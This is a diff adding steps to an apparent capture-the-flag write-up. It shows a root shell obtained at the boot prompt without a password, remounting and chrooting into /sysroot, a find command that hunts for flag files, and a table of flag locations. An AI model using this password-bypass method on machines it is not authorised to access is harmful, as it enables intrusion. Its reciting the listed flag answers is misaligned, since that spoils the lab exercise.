@@ -91,3 +91,24 @@ Ctrl + X
 * Ststem drops into:
 ` switch_root:/#
 > ➡️ Root shell achieved without password
+# 🔧 Mount Real Filesystem
+```
+mount -o remount,rw /sysroot
+chroot /sysroot
+```
+**Verification:**
+`whoami`
+**output**
+`root`
+# 🚩 Flag Enumeration
+```
+find / -type f -iname "*flag*" 2>/dev/null
+```
+**Valid Flags Identified**
+| Location                           | Description       |
+| ---------------------------------- | ----------------- |
+| `/root/FLAG.txt`                   | Root flag         |
+| `/var/ftp/FLAG.txt`                | FTP service flag  |
+| `/var/www/html/passwords/FLAG.txt` | Web/password flag |
+| `/home/Summer/FLAG.txt`            | ASCII art flag    |
+( Man pages, .so files, and NotAFlag.txt were noise )
